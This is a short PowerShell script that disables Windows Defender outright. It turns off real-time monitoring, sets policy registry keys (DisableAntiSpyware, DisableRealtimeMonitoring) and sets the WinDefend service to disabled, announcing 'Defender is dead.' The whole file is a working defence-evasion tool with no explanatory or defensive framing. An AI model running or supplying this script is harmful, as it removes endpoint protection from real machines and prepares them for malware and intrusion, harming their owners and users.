Write-Host "[*] Killing Windows Defender..." -ForegroundColor Cyan

Set-MpPreference -DisableRealtimeMonitoring $true

$registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
if (!(Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force
}

Set-ItemProperty -Path $registryPath -Name "DisableAntiSpyware" -Value 1

$realTimePath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
if (!(Test-Path $realTimePath)) {
    New-Item -Path $realTimePath -Force
}
Set-ItemProperty -Path $realTimePath -Name "DisableRealtimeMonitoring" -Value 1

Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend" -Name "Start" -Value 4

Write-Host "[+] Defender is dead. Restart recommended." -ForegroundColor Green